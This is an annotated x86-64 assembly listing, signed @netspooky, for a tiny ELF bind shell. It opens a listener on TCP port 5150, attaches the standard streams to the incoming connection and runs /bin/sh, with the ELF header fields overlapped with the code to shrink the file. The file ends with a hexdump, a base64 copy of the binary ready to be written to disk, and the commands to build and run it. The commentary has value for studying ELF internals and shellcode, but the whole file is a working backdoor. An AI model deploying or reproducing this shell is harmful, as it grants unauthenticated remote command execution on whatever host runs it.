;-- bind shell on port 5150 ------------------------------------------------//--
BITS 64 
  org 0x100000000
;---------------------+------+-------------+-----------------------------------+
; Code Listing        | OFFS |  ASSEMBLY   | CODE COMMENT                      |
;---------------------+------+-------------+-----------------------------------+
  db 0x7F, "ELF"      ; 0x0  |    7f454c46 | Elf Magic Value                   |
_start:               ;      |             |-- Begin socket syscall            |
;-- int socket(int domain, int type, int protocol); ------------------------//-+
; rdi = sockfd                                                                 |
; rsi = sockaddr                                                               |
; rdx = addrlen                                                                |
;---------------------------------------------- returns socket fd if success --+
  push byte 0x29      ; 0x04 |        6a29 | Syscall 41 - socket               |
  pop rax             ; 0x06 |          58 | Putting it into RAX               |
  push byte 0x2       ; 0x07 |        6a02 | AF_INET                           |
  pop rdi             ; 0x09 |          5f | Into RDI                          |
  push byte 0x1       ; 0x0A |        6a01 | SOCK_STREAM                       |
  pop rsi             ; 0x0C |          5e | Into RSI                          |
  cdq                 ; 0x0D |          99 | RDX = 0 sign extend RAX into RDX. |
  jmp short conec     ; 0x0E |       eb 3c | Then onto the rest of our code    |
  dw 2                ; 0x10 |       02 00 | e_type                            |
  dw 0x3e             ; 0x12 |       3e 00 | e_machine                         |
  dd 1                ; 0x14 | 01 00 00 00 | e_version                         |
  dd _start - $$      ; 0x18 | 04 00 00 00 | e_entry                           |
phdr:                 ;      |             |-- Begin Program Header            |
  dd 1                ; 0x1C | 01 00 00 00 |                  [PHDR] p_type    |
  dd phdr - $$        ; 0x20 | 1C 00 00 00 | [EHDR] e_phoff   [PHDR] p_flags   |
  dd 0                ; 0x24 | 00 00 00 00 |                  [PHDR] p_offset  |
  dd 0                ; 0x28 | 00 00 00 00 | [EHDR] e_shoff                    |
  dq $$               ; 0x2C | 00 00 00 00 |                  [PHDR] p_vaddr   |
                      ; 0x30 | 01 00 00 00 | [EHDR] e_flags                    |
  dw 0x40             ; 0x34 |       40 00 | [EHDR] e_ehsize  [PHDR] p_addr    |
  dw 0x38             ; 0x36 |       38 00 | [EHDR] e_phentsize                |
  dw 1                ; 0x38 |       01 00 | [EHDR] e_phnum                    |
  dw 2                ; 0x3A |       02 00 | [EHDR] e_shentsize                |
execy:                ;      |             |-- Begin execve syscall            |
  add al, 0x3b        ; 0x3C |        043b | execve syscall                    |
  syscall             ; 0x3E |        0f05 | Call kernel                       |
  dd 0                ; 0x40 |             | [PHDR] p_filesz                   |
  add al, 0x3b        ; 0x44 |        043b | execve syscall                    |
  syscall             ; 0x46 |        0f05 | Call kernel                       |
  dd 0                ; 0x48 | 00 00 00 00 | [PHDR] p_memsz                    |
conec:                ;      |             |-- Begin connect syscall           |
  syscall             ; 0x4C |        0f05 | Execute syscall we set up before. |
;-- bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); ------//-+
; rdi = sockfd                                                                 |
; rsi = sockaddr                                                               |
; rdx = addrlen                                                                |
;------------------------------------------------------ returns 0 if success --+
  mov  rdi,rax               ; 4989c0         ; Save fd in rdi, is preserved   |
  xor  rbx,rbx               ; 4831db         ; get a 0 in rbx                 |
  push rbx                   ; 55             ; push twice                     |
  push rbx                   ; 55             ; 0.0.0.0                        |
  mov  BYTE [rsp],0x2        ; c6042402       ; AF_INET                        |
  mov  WORD [rsp+0x2],0x1e14 ; 66c7442402141e ; Put port 5150 on stack         |
  mov  rsi,rsp               ; 4889e6         ; sockaddr                       |
  push 0x10                  ; 6a10           ; addrlen                        |
  pop  rdx                   ; 5a             ; addrlen is 16                  |
  push 0x31                  ; 6a31           ; syscall 49 - bind              |
  pop  rax                   ; 58                                              |
  syscall                    ; 0f05                                            |
;-- listen(int sockfd, int backlog); ---------------------------------------//-+
; rdi = sockfd                                                                 |
; rsi = backlog - maximum connection queue                                     |
;------------------------------------------------------ returns 0 if success --+
  push 0x1                   ; 6a01 ; We just want one connection in the queue |
  pop  rsi                   ; 5e                                              |
  push 0x32                  ; 6a32 ; syscall 50 - listen                      |
  pop  rax                   ; 58                                              |
  syscall                    ; 0f05                                            |
;-- accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); ---------//-+
; rdi = sockfd                                                                 |
; rsi = sockaddr                                                               |
; rdx = addrlen                                                                |
;----------------------------------------------- returns socketfd if success --+
  mov  rsi,rsp               ; 4889e6                                          |
  xor  rcx,rcx               ; 4831c9                                          |
  mov  cl,0x10               ; b110                                            |
  push rcx                   ; 51                                              |
  mov  rdx,rsp               ; 4889e2                                          |
  push 0x2b                  ; 6a2b            ; syscall 43 - accept           |
  pop  rax                   ; 58                                              |
  syscall                    ; 0f05                                            |
;-- Handling the fd here and preparing for dup2 loop -----------------------//-+
  pop  rcx                   ; 59                                              |
  mov  rdi, rax              ; 4889c7 ; put fd in rdi                          |
  push 0x3                   ; 6a03                                            |
  pop  rsi                   ; 5e                                              |
;-- dup2(int oldfd, int newfd); --------------------------------------------//-+
; rdi = oldfd                                                                  |
; rsi = newfd                                                                  |
;----------------- Copies file descriptors stdin (0), stdout (1), stderr (2) --+
dup2:                        ;                                                 |
  dec  rsi                   ; 48ffce                                          |
  push 0x21                  ; 6a21                                            |
  pop  rax                   ; 58                                              |
  syscall                    ; 0f05                                            |
  jne  dup2                  ; 75f6                                            |
;-- execve(const char *pathname, char *const argv[],char *const envp[]); ---//-+
; rdi = pointer to /bin/sh                                                     |
; rsi = argv - 0                                                               |
; rdx = envp - 0                                                               |
;----------------------------------------- on success, execve doesn't return --+
  cdq                         ; 99            ; zero out rdx                   |
  mov  esi,edx                ; 4831f6                                         |
  mov  rdi,0x68732f6e69622f2f ; 48bf2f2f62696e2f7368                           |
  shr  rdi,0x8                ; 48c1ef08                                       |
  push rdi                    ; 57                                             |
  push rsp                    ; 54                                             |
  pop  rdi                    ; 5f            ; point rdi to /bin/sh string    |
  jmp  short execy            ; eb90          ; ret2programheaders             |
;-- hexdump ----------------------------------------------------------------//-+
;                                                                              |
;     00000000: 7f45 4c46 6a29 586a 025f 6a01 5e99 eb3c  .ELFj)Xj._j.^..<      |
;     00000010: 0200 3e00 0100 0000 0400 0000 0100 0000  ..>.............      |
;     00000020: 1c00 0000 0000 0000 0000 0000 0000 0000  ................      |
;     00000030: 0100 0000 4000 3800 0100 0200 043b 0f05  ....@.8......;..      |
;     00000040: 0000 0000 043b 0f05 0000 0000 0f05 4889  .....;........H.      |
;     00000050: c748 31db 5353 c604 2402 66c7 4424 0214  .H1.SS..$.f.D$..      |
;     00000060: 1e48 89e6 6a10 5a6a 3158 0f05 6a01 5e6a  .H..j.Zj1X..j.^j      |
;     00000070: 3258 0f05 4889 e648 31c9 b110 5148 89e2  2X..H..H1...QH..      |
;     00000080: 6a2b 580f 0559 4889 c76a 035e 48ff ce6a  j+X..YH..j.^H..j      |
;     00000090: 2158 0f05 75f6 9989 d648 bf2f 2f62 696e  !X..u....H.//bin      |
;     000000a0: 2f73 6848 c1ef 0857 545f eb90            /shH...WT_..          |
;                                                                              |
; base64 encoded version, just use the standard tricks to get this into a file |
;                                                                              |
; f0VMRmopWGoCX2oBXpnrPAIAPgABAAAABAAAAAEAAAAcAAAAAAAAAAAAAAAAAAAAAQAAAEAAOAAB |
; AAIABDsPBQAAAAAEOw8FAAAAAA8FSInHSDHbU1PGBCQCZsdEJAIUHkiJ5moQWmoxWA8FagFeajJY |
; DwVIieZIMcmxEFFIieJqK1gPBVlIicdqA15I/85qIVgPBXX2mYnWSL8vL2Jpbi9zaEjB7whXVF/r |
; kA==                                                                         |
;                                                                              |
; Otherwise compile like this:                                                 |
;                                                                              |
;   nasm -f bin ubind.asm -o ubind                                             |
;   chmod +x ubind                                                             |
;   ./ubind                                                                    |
;                                                                              |
;---------------------------------------------------------------- @netspooky --+
